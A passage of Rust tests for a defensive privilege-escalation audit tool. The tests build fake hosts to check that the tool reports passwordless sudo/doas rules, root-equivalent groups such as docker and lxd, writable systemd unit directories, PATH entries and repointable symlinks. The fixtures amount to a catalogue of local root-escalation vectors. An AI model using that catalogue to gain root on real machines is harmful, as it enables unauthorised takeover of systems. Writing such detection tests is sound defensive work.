//! The report against described machines.
//!
//! Measured code, like the module it tests: every helper that takes a finding
//! apart returns an `Option` and is shown both answers, so no arm here is one
//! only a broken test could reach.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::indexing_slicing,
    clippy::arithmetic_side_effects
)]

use super::walk::{self, Outcome};
use super::*;

const ME: u32 = 1000;
const ALICE: u32 = 1001;

const PASSWD: &[u8] = b"root:x:0:0:root:/root:/bin/bash\n\
    yamin:x:1000:1000:Y:/home/yamin:/bin/bash\n\
    alice:x:1001:1001::/home/alice:/bin/sh\n";

const GROUP: &[u8] = b"root:x:0:\n\
    adm:x:4:yamin\n\
    sudo:x:27:\n\
    docker:x:999:\n\
    aido:x:998:\n\
    yamin:x:1000:\n";

fn caller(groups: &[u32]) -> Caller {
    Caller {
        uid: ME,
        gid: ME,
        groups: Lookup::Found(groups.to_vec()),
    }
}

fn root_caller() -> Caller {
    Caller {
        uid: 0,
        gid: 0,
        groups: Lookup::Found(vec![0]),
    }
}

/// A host on which nothing is wrong and everything can be examined.
fn clean() -> MemoryHost {
    clean_for(caller(&[ME]))
}

fn clean_for(who: Caller) -> MemoryHost {
    MemoryHost::new(who)
        .dir("/", 0, 0, 0o755)
        .dir("/etc", 0, 0, 0o755)
        .file("/etc/passwd", 0, 0, 0o644, PASSWD)
        .file("/etc/group", 0, 0, 0o644, GROUP)
        .dir("/usr", 0, 0, 0o755)
        .dir("/usr/bin", 0, 0, 0o755)
        .file("/usr/bin/sudo", 0, 0, 0o4755, b"")
        .dir("/usr/sbin", 0, 0, 0o755)
        .file("/usr/sbin/usermod", 0, 0, 0o755, b"")
        .dir("/root", 0, 0, 0o700)
        .dir("/home", 0, 0, 0o755)
        .dir("/home/yamin", ME, ME, 0o755)
}

fn input(path: &str) -> Input<'_> {
    Input {
        user_path: Some(OsStr::new(path)),
        backend_exe: Some(Path::new("/usr/bin/sudo")),
    }
}

fn run(host: &dyn HostView, path: &str) -> Report {
    assess(host, &input(path))
}

fn check(report: &Report, id: CheckId) -> &Check {
    report.checks.iter().find(|c| c.check == id).unwrap()
}

fn p(path: &str) -> PathBuf {
    PathBuf::from(path)
}

/// `(path, at, via)` of a writable finding.
fn writable_at(finding: &Finding) -> Option<(String, String, Via)> {
    match finding {
        Finding::Writable { path, at, via, .. } => {
            Some((path.display().to_string(), at.display().to_string(), *via))
        }
        Finding::PasswordlessRule { .. }
        | Finding::GroupMembership { .. }
        | Finding::RelativePathEntry { .. } => None,
    }
}

/// Who can write a writable finding.
fn writers_of(finding: &Finding) -> Option<&[Writer]> {
    match finding {
        Finding::Writable { writers, .. } => Some(writers),
        Finding::PasswordlessRule { .. }
        | Finding::GroupMembership { .. }
        | Finding::RelativePathEntry { .. } => None,
    }
}

/// `(file, line, grant, applies)` of a passwordless rule.
fn rule_of(finding: &Finding) -> Option<(String, usize, Grant, Applies)> {
    match finding {
        Finding::PasswordlessRule {
            file,
            line,
            grant,
            applies_to_you,
            ..
        } => Some((file.display().to_string(), *line, *grant, *applies_to_you)),
        Finding::GroupMembership { .. }
        | Finding::Writable { .. }
        | Finding::RelativePathEntry { .. } => None,
    }
}

/// `(group, passwordless, listed, active)` of a membership.
fn group_of(finding: &Finding) -> Option<(String, bool, bool, bool)> {
    match finding {
        Finding::GroupMembership {
            group,
            passwordless,
            listed,
            active,
            ..
        } => Some((group.clone(), *passwordless, *listed, *active)),
        Finding::PasswordlessRule { .. }
        | Finding::Writable { .. }
        | Finding::RelativePathEntry { .. } => None,
    }
}

/// The finding a walk produced, or the outcome it was instead.
fn finding_of(outcome: Outcome) -> Result<Finding, Outcome> {
    match outcome {
        Outcome::Writable(found) => Ok(found.into_finding(None)),
        other @ (Outcome::Clean { .. } | Outcome::Unverified(_)) => Err(other),
    }
}

fn clean_at(path: &str, kind: Kind) -> Outcome {
    Outcome::Clean {
        target: Some((p(path), kind)),
    }
}

fn gap(path: &str, at: &str, reason: &str) -> Unverified {
    Unverified::new(Path::new(path), Path::new(at), reason)
}

#[test]
fn the_helpers_answer_none_for_every_other_kind_of_finding() {
    let relative = Finding::RelativePathEntry { entry: p(".") };
    assert_eq!(writable_at(&relative), None);
    assert_eq!(writers_of(&relative), None);
    assert_eq!(rule_of(&relative), None);
    assert_eq!(group_of(&relative), None);
    let ctx_host = clean();
    let ctx = Ctx::new(&ctx_host);
    assert_eq!(
        finding_of(walk::examine(&ctx, Path::new("/usr/bin"))),
        Err(clean_at("/usr/bin", Kind::Directory))
    );
}

// --- the whole report ------------------------------------------------------

#[test]
fn a_clean_machine_is_reported_clean_in_every_check() {
    let report = run(&clean(), "/usr/bin:/usr/sbin");
    for c in &report.checks {
        assert_eq!(c.status, Status::Clean, "{c:?}");
    }
    assert_eq!(report.status, Status::Clean);
    assert_eq!(report.finding_count(), 0);
    assert_eq!(report.unverified_count(), 0);
    assert_eq!(report.subject.name.as_deref(), Some("yamin"));
    assert!(!report.subject.is_root);
    // adm lists yamin, so the next login holds it, though this process does not.
    let adm = report.subject.groups.iter().find(|g| g.gid == 4).unwrap();
    assert!(adm.listed && !adm.active, "{adm:?}");
    assert_eq!(
        report.aido_group,
        AidoGroup {
            exists: true,
            gid: Some(998),
            member: false
        }
    );
    // Every check ran, in the documented order.
    let order: Vec<CheckId> = report.checks.iter().map(|c| c.check).collect();
    assert_eq!(
        order,
        vec![
            CheckId::PasswordlessRules,
            CheckId::GroupMemberships,
            CheckId::UnitDirectories,
            CheckId::RootPath,
            CheckId::UserPath,
            CheckId::RootShellStartup,
        ]
    );
    // Both entries come from /usr/bin on, so nothing on this PATH is ahead.
    let user = check(&report, CheckId::UserPath);
    assert_eq!(user.examined, 0);
    assert_eq!(
        user.note.as_deref(),
        Some(
            "the entries from /usr/bin on (2) were not examined: nothing there is found \
             before /usr/bin/sudo"
        )
    );
}

#[test]
fn an_unreadable_sudoers_is_unverified_and_never_reported_clean() {
    // The case on every normal host: /etc/sudoers is 0440 root:root. Saying
    // "no NOPASSWD entries" here would be the most dangerous line aido prints.
    let host = clean().unreadable_file("/etc/sudoers", 0, 0, 0o440);
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    assert_eq!(rules.status, Status::Unverified);
    assert_eq!(rules.unverified[0].path, p("/etc/sudoers"));
    assert!(rules.unverified[0].reason.contains("Permission denied"));
    // The directory it conventionally includes was tried, and is absent here.
    assert!(rules.note.as_deref().unwrap().contains("/etc/sudoers.d"));
    // Root's secure_path lives in that file, so root's PATH is unverified too.
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(root_path.status, Status::Unverified);
    assert!(root_path.unverified[0].reason.contains("secure_path"));
    assert_eq!(report.status, Status::Unverified);
    assert_eq!(report.unverified_count(), 2);
}

#[test]
fn denies_a_cloud_images_standing_grant_behind_an_unreadable_sudoers() {
    // Ubuntu cloud images ship `ubuntu ALL=(ALL) NOPASSWD:ALL` in
    // /etc/sudoers.d. When /etc/sudoers itself cannot be read, the directory
    // every stock one includes is read anyway: a readable grant there is
    // reported, and an unreadable file there is named rather than skipped.
    let host = clean()
        .unreadable_file("/etc/sudoers", 0, 0, 0o440)
        .dir("/etc/sudoers.d", 0, 0, 0o755)
        .file(
            "/etc/sudoers.d/90-cloud-init-users",
            0,
            0,
            0o444,
            b"yamin ALL=(ALL) NOPASSWD:ALL\n",
        )
        .unreadable_file("/etc/sudoers.d/README", 0, 0, 0o440)
        .file(
            "/etc/sudoers.d/skipped.conf",
            0,
            0,
            0o444,
            b"yamin ALL=NOPASSWD: ALL\n",
        );
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    assert_eq!(rules.status, Status::Found);
    assert_eq!(
        rules.findings.iter().map(rule_of).collect::<Vec<_>>(),
        vec![Some((
            "/etc/sudoers.d/90-cloud-init-users".to_owned(),
            1,
            Grant::Nopasswd,
            Applies::Yes
        ))]
    );
    let gaps: Vec<&Path> = rules.unverified.iter().map(|u| u.path.as_path()).collect();
    assert_eq!(
        gaps,
        vec![
            Path::new("/etc/sudoers"),
            Path::new("/etc/sudoers.d/README")
        ]
    );
}

#[test]
fn denies_a_nopasswd_rule_hidden_in_an_included_drop_in() {
    let host = clean()
        .file(
            "/etc/sudoers",
            0,
            0,
            0o440,
            b"Defaults secure_path=\"/opt/rootbin:/usr/bin:relative\"\n\
              #includedir /etc/sudoers.d\n\
              @include extra\n\
              #include /etc/sudoers\n",
        )
        .dir("/etc/sudoers.d", 0, 0, 0o750)
        .file(
            "/etc/sudoers.d/10-local",
            0,
            0,
            0o440,
            b"%adm ALL=(ALL) NOPASSWD: ALL\n",
        )
        .file(
            "/etc/sudoers.d/README.txt",
            0,
            0,
            0o440,
            b"yamin ALL=(ALL) NOPASSWD: ALL\n",
        )
        .file(
            "/etc/sudoers.d/old~",
            0,
            0,
            0o440,
            b"yamin ALL=NOPASSWD: ALL\n",
        )
        .file(
            "/etc/sudoers.d/20-others",
            0,
            0,
            0o440,
            b"alice ALL=(ALL) NOPASSWD: /bin/true\n\
              ADMINS ALL=(ALL) NOPASSWD: ALL\n",
        )
        .file("/etc/extra", 0, 0, 0o440, b"Defaults !authenticate\n")
        .dir("/opt", 0, 0, 0o755)
        .dir("/opt/rootbin", 0, 0, 0o755);
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    assert_eq!(rules.status, Status::Found);
    // The dotted and the tilde file are skipped, as sudo skips them, and a
    // file that includes itself is read once. Includes are read in the order
    // they are named, each file's after the file that names them.
    assert_eq!(
        rules.findings.iter().map(rule_of).collect::<Vec<_>>(),
        vec![
            Some((
                "/etc/sudoers.d/10-local".to_owned(),
                1,
                Grant::Nopasswd,
                Applies::Yes
            )),
            Some((
                "/etc/sudoers.d/20-others".to_owned(),
                1,
                Grant::Nopasswd,
                Applies::No
            )),
            Some((
                "/etc/sudoers.d/20-others".to_owned(),
                2,
                Grant::Nopasswd,
                Applies::Maybe
            )),
            Some((
                "/etc/extra".to_owned(),
                1,
                Grant::NoAuthenticate,
                Applies::Yes
            )),
        ]
    );
    // Files read: sudoers, extra, the listing, 10-local, 20-others.
    assert_eq!(rules.examined, 5);
    assert_eq!(rules.note, None);
    // secure_path feeds root's PATH, relative entry and all.
    let root_path = check(&report, CheckId::RootPath);
    assert!(
        root_path
            .note
            .as_deref()
            .unwrap()
            .contains("/etc/sudoers names")
    );
    assert!(root_path.findings.contains(&Finding::RelativePathEntry {
        entry: p("relative")
    }));
}

#[test]
fn includes_that_cannot_be_followed_are_unverified_not_ignored() {
    let mut host = clean()
        .file(
            "/etc/sudoers",
            0,
            0,
            0o440,
            b"#include /etc/sudoers.%h\n\
              #includedir /etc/sealed.d\n\
              #include /etc/absent\n\
              #include /etc/i1\n",
        )
        .sealed_dir("/etc/sealed.d", 0, 0, 0o700);
    for n in 1..=9 {
        host = host.file(
            &format!("/etc/i{n}"),
            0,
            0,
            0o440,
            format!("#include /etc/i{}\n", n + 1).as_bytes(),
        );
    }
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    let reasons: Vec<&str> = rules.unverified.iter().map(|u| u.reason.as_str()).collect();
    assert_eq!(reasons.len(), 4, "{reasons:?}");
    assert!(reasons[0].contains("%h"), "{reasons:?}");
    assert!(reasons[1].contains("Permission denied"), "{reasons:?}");
    // `#include /etc/absent`: an include of nothing is a gap, not silence.
    assert!(reasons[2].contains("does not exist"), "{reasons:?}");
    assert_eq!(rules.unverified[2].path, p("/etc/absent"));
    assert!(reasons[3].contains("nest deeper"), "{reasons:?}");
    assert_eq!(rules.unverified[3].path, p("/etc/i8"));
    assert_eq!(rules.status, Status::Unverified);
}

#[test]
fn doas_nopass_rules_are_found_in_the_conf_and_its_drop_ins() {
    let host = clean()
        .file(
            "/etc/doas.conf",
            0,
            0,
            0o400,
            b"permit nopass :wheel\npermit persist yamin\npermit nopass yamin as root\n",
        )
        .dir("/etc/doas.d", 0, 0, 0o755)
        .file(
            "/etc/doas.d/50-x.conf",
            0,
            0,
            0o400,
            b"permit nopass :1000\n",
        )
        .file(
            "/etc/doas.d/60-y.conf",
            0,
            0,
            0o400,
            b"permit nopass 1000\n",
        )
        .file(
            "/etc/doas.d/61-z.conf",
            0,
            0,
            0o400,
            b"permit nopass 1001\n",
        )
        .file(
            "/etc/doas.d/62-q.conf",
            0,
            0,
            0o400,
            b"permit nopass :adm\n",
        )
        .file("/etc/doas.d/.hidden", 0, 0, 0o400, b"permit nopass yamin\n")
        .file("/etc/doas.d/old~", 0, 0, 0o400, b"permit nopass yamin\n")
        .unreadable_file("/etc/doas.d/70-secret", 0, 0, 0o400);
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    let found: Vec<Option<(Grant, Applies)>> = rules
        .findings
        .iter()
        .map(|f| rule_of(f).map(|(_, _, grant, applies)| (grant, applies)))
        .collect();
    let nopass = |applies| Some((Grant::Nopass, applies));
    assert_eq!(
        found,
        vec![
            // No `wheel` in the fixture's /etc/group: a directory service
            // may have one, so it is "maybe", not "names others".
            nopass(Applies::Maybe),
            nopass(Applies::Yes),
            nopass(Applies::Yes),
            nopass(Applies::Yes),
            nopass(Applies::No),
            nopass(Applies::Yes),
        ]
    );
    assert_eq!(rules.unverified.len(), 1);
    assert_eq!(rules.status, Status::Found);
}

#[test]
fn a_user_list_item_is_matched_by_name_uid_and_group() {
    let host = clean_for(caller(&[ME, 27]));
    let ctx = Ctx::new(&host);
    let items = |list: &[&str]| Scope::Users(list.iter().map(|i| i.as_bytes().to_vec()).collect());
    for (list, expected) in [
        (&["ALL"][..], Applies::Yes),
        (&["yamin"][..], Applies::Yes),
        (&["#1000"][..], Applies::Yes),
        (&["#1001"][..], Applies::No),
        (&["#x"][..], Applies::Maybe),
        (&["%sudo"][..], Applies::Yes),
        (&["%adm"][..], Applies::Yes),
        (&["%docker"][..], Applies::No),
        (&["%#27"][..], Applies::Yes),
        (&["%#99"][..], Applies::No),
        (&["%#"][..], Applies::Maybe),
        (&["%:nonunix"][..], Applies::Maybe),
        (&["+netgroup"][..], Applies::Maybe),
        (&["!yamin"][..], Applies::Maybe),
        (&["ADMINS"][..], Applies::Maybe),
        (&["alice", "ADMINS"][..], Applies::Maybe),
        (&["alice", "bob"][..], Applies::Maybe),
        (&["alice", "root"][..], Applies::No),
        (&["alice", "yamin"][..], Applies::Yes),
    ] {
        assert_eq!(ctx.applies(&items(list)), expected, "{list:?}");
    }
    assert_eq!(ctx.applies(&Scope::Everyone), Applies::Yes);
    assert_eq!(ctx.applies(&Scope::Unknown), Applies::Maybe);
    for (identity, expected) in [
        (&b":sudo"[..], Applies::Yes),
        (b":27", Applies::Yes),
        (b":docker", Applies::No),
        (b":999", Applies::No),
        (b"yamin", Applies::Yes),
        (b"1000", Applies::Yes),
        (b"alice", Applies::No),
        (b"1001", Applies::No),
    ] {
        assert_eq!(
            ctx.applies(&Scope::DoasIdentity(identity.to_vec())),
            expected,
            "{identity:?}"
        );
    }
}

#[test]
fn root_equivalent_membership_is_found_whether_listed_or_held() {
    let host = clean_for(caller(&[ME, 997, 4242])).file(
        "/etc/group",
        0,
        0,
        0o644,
        b"sudo:x:27:yamin\ndocker:x:999:alice,yamin\nlxd:x:997:\ninput:x:105:alice\n",
    );
    let report = run(&host, "/usr/bin");
    let groups = check(&report, CheckId::GroupMemberships);
    assert_eq!(
        groups.findings.iter().map(group_of).collect::<Vec<_>>(),
        vec![
            Some(("sudo".to_owned(), false, true, false)),
            Some(("docker".to_owned(), true, true, false)),
            Some(("lxd".to_owned(), true, false, true)),
        ]
    );
    assert_eq!(groups.examined, ROOT_GROUPS.len());
    // gid 4242 is held but named nowhere: it might be docker under a
    // directory service, so it is said, not assumed away.
    assert_eq!(groups.unverified.len(), 2, "{:?}", groups.unverified);
    assert!(
        groups
            .unverified
            .iter()
            .any(|u| u.reason.contains("gid 4242"))
    );
    assert!(
        groups
            .unverified
            .iter()
            .any(|u| u.reason.contains("gid 1000"))
    );
    assert_eq!(groups.status, Status::Found);
}

#[test]
fn every_group_aido_calls_root_says_why_and_the_passwordless_ones_say_what_instead() {
    for group in &ROOT_GROUPS {
        assert!(group.grants.len() > 40, "{}", group.name);
        assert_eq!(
            group.passwordless,
            !group.instead.is_empty(),
            "{}",
            group.name
        );
    }
    let names: Vec<&str> = ROOT_GROUPS.iter().map(|g| g.name).collect();
    for required in ["wheel", "sudo", "docker", "lxd"] {
        assert!(names.contains(&required), "{required}");
    }
}

#[test]
fn the_group_check_says_what_it_could_not_see() {
    let host = MemoryHost::new(Caller {
        uid: ME,
        gid: ME,
        groups: Lookup::Unreadable("EINVAL".to_owned()),
    })
    .dir("/", 0, 0, 0o755)
    .dir("/etc", 0, 0, 0o755)
    .unreadable_file("/etc/group", 0, 0, 0o600);
    let report = run(&host, "/usr/bin");
    let groups = check(&report, CheckId::GroupMemberships);
    let at: Vec<String> = groups
        .unverified
        .iter()
        .map(|u| u.path.display().to_string())
        .collect();
    assert_eq!(
        at,
        vec![
            "/etc/passwd",
            "/etc/group",
            "/proc/self/status",
            "/etc/group"
        ],
        "{:?}",
        groups.unverified
    );
    assert!(groups.unverified[0].reason.contains("does not exist"));
    assert_eq!(groups.status, Status::Unverified);
    assert_eq!(report.subject.name, None);
    // Without /etc/passwd root's home is assumed, and the report says so.
    let startup = check(&report, CheckId::RootShellStartup);
    assert!(startup.note.as_deref().unwrap().contains("/root"));
}

#[test]
fn a_caller_absent_from_passwd_cannot_be_matched_by_name_and_says_so() {
    let host = clean().file("/etc/passwd", 0, 0, 0o644, b"root:x:0:0::/root:/bin/sh\n");
    let report = run(&host, "/usr/bin");
    let groups = check(&report, CheckId::GroupMemberships);
    assert!(
        groups
            .unverified
            .iter()
            .any(|u| u.reason.contains("uid 1000 has no entry")),
        "{:?}",
        groups.unverified
    );
}

#[test]
fn a_name_that_is_not_utf8_is_matched_byte_exactly_and_shown_as_unnamed() {
    let host = clean()
        .file(
            "/etc/passwd",
            0,
            0,
            0o644,
            b"y\xffmin:x:1000:1000::/home/y:/bin/sh\n",
        )
        .file("/etc/group", 0, 0, 0o644, b"docker:x:999:y\xffmin\n");
    let report = run(&host, "/usr/bin");
    assert_eq!(report.subject.name, None);
    let groups = check(&report, CheckId::GroupMemberships);
    assert_eq!(groups.findings.len(), 1, "{:?}", groups.findings);
}

#[test]
fn root_is_skipped_for_groups_and_is_never_writable_by_itself() {
    let host = clean_for(root_caller())
        .dir("/etc/systemd", 0, 0, 0o755)
        .dir("/etc/systemd/system", 0, 0, 0o755)
        .acl_writable("/etc/systemd/system")
        .dir("/run", 0, 0, 0o755)
        .dir("/run/systemd", 0, 0, 0o775);
    let report = run(&host, "/usr/bin");
    assert!(report.subject.is_root);
    let groups = check(&report, CheckId::GroupMemberships);
    assert_eq!(groups.status, Status::Skipped);
    assert!(groups.note.as_deref().unwrap().contains("you are root"));
    // Root can write anything, so access(2) is not asked; but a directory
    // the root group can write is still somebody else's way in.
    let units = check(&report, CheckId::UnitDirectories);
    assert_eq!(
        units.findings.iter().map(writable_at).collect::<Vec<_>>(),
        vec![Some((
            "/run/systemd/system.control".to_owned(),
            "/run/systemd".to_owned(),
            Via::Ancestor
        ))]
        .into_iter()
        .chain(
            [
                "/run/systemd/transient",
                "/run/systemd/generator.early",
                "/run/systemd/system",
                "/run/systemd/system.attached",
                "/run/systemd/generator",
                "/run/systemd/generator.late",
                "/run/systemd/system-generators",
            ]
            .map(|path| Some((
                path.to_owned(),
                "/run/systemd".to_owned(),
                Via::Ancestor
            )))
        )
        .collect::<Vec<_>>()
    );
    assert_eq!(
        writers_of(&units.findings[0]),
        Some(
            &[Writer::Group {
                gid: 0,
                name: Some("root".to_owned()),
                you: true
            }][..]
        )
    );
}

// --- unit directories ------------------------------------------------------

/// A host with one of every way a unit directory goes wrong.
fn units_host() -> MemoryHost {
    clean_for(caller(&[ME, 4]))
        .dir("/etc/systemd", 0, 0, 0o755)
        .dir("/etc/systemd/system", 0, 4, 0o775)
        .dir("/run", 0, 0, 0o755)
        .dir("/run/systemd", 0, 0, 0o755)
        .dir("/run/systemd/system", ALICE, ALICE, 0o755)
        .dir("/usr/lib", 0, 0, 0o755)
        .dir("/usr/lib/systemd", 0, 0, 0o1777)
        .dir("/usr/lib/systemd/system", 0, 0, 0o755)
        .file("/usr/lib/systemd/system/a.service", 0, 0, 0o644, b"")
        .file("/usr/lib/systemd/system/b.service", 0, 0, 0o666, b"")
        .dir("/usr/lib/systemd/system/c.service.d", 0, 0, 0o755)
        .file(
            "/usr/lib/systemd/system/c.service.d/override.conf",
            0,
            4,
            0o664,
            b"",
        )
        .dir(
            "/usr/lib/systemd/system/multi-user.target.wants",
            0,
            0,
            0o755,
        )
        .link(
            "/usr/lib/systemd/system/multi-user.target.wants/a.service",
            "../a.service",
        )
        .link(
            "/usr/lib/systemd/system/multi-user.target.wants/home.service",
            "/home/yamin/home.service",
        )
        .file("/home/yamin/home.service", ME, ME, 0o644, b"")
        .link("/usr/lib/systemd/system/masked.service", "/dev/null")
        .dir("/dev", 0, 0, 0o755)
        .char_device("/dev/null", 0, 0, 0o666)
        .dir("/usr/lib/systemd/system/plain", 0, 0, 0o755)
        .file("/usr/lib/systemd/system/plain/ignored", 0, 0, 0o666, b"")
        .sealed_dir("/usr/lib/systemd/system/sealed.d", 0, 0, 0o700)
        .fault(
            "/usr/lib/systemd/system/gone.service",
            "Input/output error (os error 5)",
        )
        .link("/lib", "usr/lib")
        .dir("/usr/local", 0, 0, 0o755)
        .dir("/usr/local/lib", 0, 0, 0o755)
        .dir("/usr/local/lib/systemd", 0, 0, 0o755)
        .dir("/usr/local/lib/systemd/system", 0, 0, 0o755)
        .acl_writable("/usr/local/lib/systemd/system")
}

#[test]
fn every_way_a_unit_directory_can_be_written_by_someone_else_is_found() {
    let report = run(&units_host(), "/usr/bin");
    let units = check(&report, CheckId::UnitDirectories);
    let found: Vec<Option<(String, String, Via)>> =
        units.findings.iter().map(writable_at).collect();
    let row = |path: &str, at: &str, via| Some((path.to_owned(), at.to_owned(), via));
    assert_eq!(
        found,
        vec![
            // Group-writable by adm, which the caller holds.
            row("/etc/systemd/system", "/etc/systemd/system", Via::Itself),
            // Owned by another user.
            row("/run/systemd/system", "/run/systemd/system", Via::Itself),
            // The ACL case: the mode bits are clean and access(2) says yes.
            row(
                "/usr/local/lib/systemd/system",
                "/usr/local/lib/systemd/system",
                Via::Itself
            ),
            // Entries: a world-writable unit, and a drop-in group-writable.
            row(
                "/usr/lib/systemd/system/b.service",
                "/usr/lib/systemd/system/b.service",
                Via::Itself
            ),
            row(
                "/usr/lib/systemd/system/c.service.d/override.conf",
                "/usr/lib/systemd/system/c.service.d/override.conf",
                Via::Itself
            ),
            // A linked unit: the link is root's, what it names is yamin's.
            row(
                "/usr/lib/systemd/system/multi-user.target.wants/home.service",
                "/home/yamin",
                Via::Ancestor
            ),
            // Missing, and its directory is sticky and world-writable: a
            // sticky bit shields an entry from rename, not a new one from
            // being created. Reached a second time through /lib.
            row(
                "/usr/lib/systemd/system-generators",
                "/usr/lib/systemd",
                Via::Missing
            ),
            row(
                "/lib/systemd/system-generators",
                "/usr/lib/systemd",
                Via::Missing
            ),
        ]
    );
    assert_eq!(
        writers_of(&units.findings[0]),
        Some(
            &[Writer::Group {
                gid: 4,
                name: Some("adm".to_owned()),
                you: true
            }][..]
        )
    );
    assert_eq!(
        writers_of(&units.findings[1]),
        Some(
            &[Writer::Owner {
                uid: ALICE,
                name: Some("alice".to_owned()),
                you: false
            }][..]
        )
    );
    assert_eq!(writers_of(&units.findings[2]), Some(&[Writer::You][..]));
    // The sealed drop-in and the failing entry are unverified; the masked
    // unit's /dev/null is not a finding; and the directory reached through
    // /lib was read once, where it really is.
    assert_eq!(
        units.unverified,
        vec![
            gap(
                "/usr/lib/systemd/system/gone.service",
                "/usr/lib/systemd/system/gone.service",
                "Input/output error (os error 5)"
            ),
            gap(
                "/usr/lib/systemd/system/sealed.d",
                "/usr/lib/systemd/system/sealed.d",
                "Permission denied (os error 13)"
            ),
        ]
    );
}

#[test]
fn a_sticky_ancestor_shields_but_a_sticky_target_does_not() {
    let host = clean()
        .dir("/tmp", 0, 0, 0o1777)
        .dir("/tmp/rootdir", 0, 0, 0o755);
    let ctx = Ctx::new(&host);
    assert_eq!(
        walk::examine(&ctx, Path::new("/tmp/rootdir")),
        clean_at("/tmp/rootdir", Kind::Directory)
    );
    let found = finding_of(walk::examine(&ctx, Path::new("/tmp"))).unwrap();
    assert_eq!(
        writable_at(&found),
        Some(("/tmp".to_owned(), "/tmp".to_owned(), Via::Itself))
    );
    assert_eq!(
        writers_of(&found),
        Some(
            &[
                Writer::Group {
                    gid: 0,
                    name: Some("root".to_owned()),
                    you: false
                },
                Writer::Everyone
            ][..]
        )
    );
    let missing = finding_of(walk::examine(&ctx, Path::new("/tmp/new"))).unwrap();
    assert_eq!(
        writable_at(&missing),
        Some(("/tmp/new".to_owned(), "/tmp".to_owned(), Via::Missing))
    );
}

#[test]
fn denies_repointing_a_link_through_its_intermediate_directory() {
    // /usr/bin/editor -> /etc/alternatives/editor -> /usr/bin/vim.basic. The
    // resolved path is root's from end to end; the middle hop's directory is
    // not, and whoever writes it chooses what root runs. A check of the
    // resolved path alone never looks there.
    let host = clean()
        .dir("/etc/alternatives", 0, 4, 0o775)
        .link("/etc/alternatives/editor", "/usr/bin/vim.basic")
        .link("/usr/bin/editor", "../../etc/alternatives/editor")
        .file("/usr/bin/vim.basic", 0, 0, 0o755, b"");
    let ctx = Ctx::new(&host);
    let found = finding_of(walk::examine(&ctx, Path::new("/usr/bin/editor"))).unwrap();
    assert_eq!(
        writable_at(&found),
        Some((
            "/usr/bin/editor".to_owned(),
            "/etc/alternatives".to_owned(),
            Via::Ancestor
        ))
    );
    // Through root's PATH, the same link is found from the directory listing.
    let report = run(&host, "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(
        root_path
            .findings
            .iter()
            .map(writable_at)
            .collect::<Vec<_>>(),
        vec![Some((
            "/usr/bin/editor".to_owned(),
            "/etc/alternatives".to_owned(),
            Via::Ancestor
        ))]
    );
}

#[test]
fn a_link_is_followed_the_way_the_kernel_follows_it() {
    let host = clean()
        .link("/bin", "usr/bin")
        .dir("/opt", 0, 0, 0o755)
        .dir("/opt/real", ALICE, ALICE, 0o755)
        .link("/etc/units", "/opt/real")
        .link("/etc/dangling", "/nowhere")
        .link("/loop-a", "/loop-b")
        .link("/loop-b", "/loop-a")
        .file("/etc/notadir", 0, 0, 0o644, b"");
    let ctx = Ctx::new(&host);
    assert_eq!(
        walk::examine(&ctx, Path::new("/bin")),
        clean_at("/usr/bin", Kind::Directory)
    );
    // `..` steps back from where the lookup is: /bin/.. is /usr, not /.
    assert_eq!(
        walk::examine(&ctx, Path::new("/bin/../sbin")),
        clean_at("/usr/sbin", Kind::Directory)
    );
    // And at / it stays at /.
    assert_eq!(
        walk::examine(&ctx, Path::new("/../etc")),
        clean_at("/etc", Kind::Directory)
    );
    // What the link points at belongs to alice.
    let found = finding_of(walk::examine(&ctx, Path::new("/etc/units"))).unwrap();
    assert_eq!(
        writable_at(&found),
        Some(("/etc/units".to_owned(), "/opt/real".to_owned(), Via::Itself))
    );
    // A path below the link: alice's directory is above it.
    let below = finding_of(walk::examine(&ctx, Path::new("/etc/units/x"))).unwrap();
    assert_eq!(
        writable_at(&below),
        Some((
            "/etc/units/x".to_owned(),
            "/opt/real".to_owned(),
            Via::Ancestor
        ))
    );
    // A link to nowhere root can be made to create is not a finding; a path
    // through a file cannot exist.
    assert_eq!(
        walk::examine(&ctx, Path::new("/etc/dangling")),
        Outcome::Clean { target: None }
    );
    assert_eq!(
        walk::examine(&ctx, Path::new("/etc/notadir/x")),
        Outcome::Clean { target: None }
    );
    // A loop cannot be called safe. The forty-first link is /loop-a again.
    assert_eq!(
        walk::examine(&ctx, Path::new("/loop-a/x")),
        Outcome::Unverified(gap(
            "/loop-a/x",
            "/loop-a",
            "it passes through too many symbolic links"
        ))
    );
    assert_eq!(walk::MAX_LINKS, 40);
}

#[test]
fn examine_refuses_whatever_it_cannot_say_is_safe() {
    let host = clean().fault("/broken", "Input/output error (os error 5)");
    let ctx = Ctx::new(&host);
    assert_eq!(
        walk::examine(&ctx, Path::new("relative/dir")),
        Outcome::Unverified(gap(
            "relative/dir",
            "relative/dir",
            "it is not an absolute path, so what it names depends on where it is looked up from"
        ))
    );
    assert_eq!(
        walk::examine(&ctx, Path::new("/broken/x")),
        Outcome::Unverified(gap(
            "/broken/x",
            "/broken",
            "Input/output error (os error 5)"
        ))
    );
    let empty = MemoryHost::new(caller(&[]));
    let ctx = Ctx::new(&empty);
    assert_eq!(
        walk::examine(&ctx, Path::new("/etc")),
        Outcome::Unverified(gap("/etc", "/", "the filesystem root cannot be examined"))
    );
    let faulty = MemoryHost::new(caller(&[])).fault("/", "EIO");
    let ctx = Ctx::new(&faulty);
    assert_eq!(
        walk::examine(&ctx, Path::new("/etc")),
        Outcome::Unverified(gap("/etc", "/", "EIO"))
    );
}

#[test]
fn a_writable_root_is_an_ancestor_of_everything() {
    let host = clean().dir("/", 0, 0, 0o777);
    let ctx = Ctx::new(&host);
    let found = finding_of(walk::examine(&ctx, Path::new("/etc/profile"))).unwrap();
    assert_eq!(
        writable_at(&found),
        Some(("/etc/profile".to_owned(), "/".to_owned(), Via::Ancestor))
    );
    let itself = finding_of(walk::examine(&ctx, Path::new("/"))).unwrap();
    assert_eq!(
        writable_at(&itself),
        Some(("/".to_owned(), "/".to_owned(), Via::Itself))
    );
    // Resolution alone judges nothing.
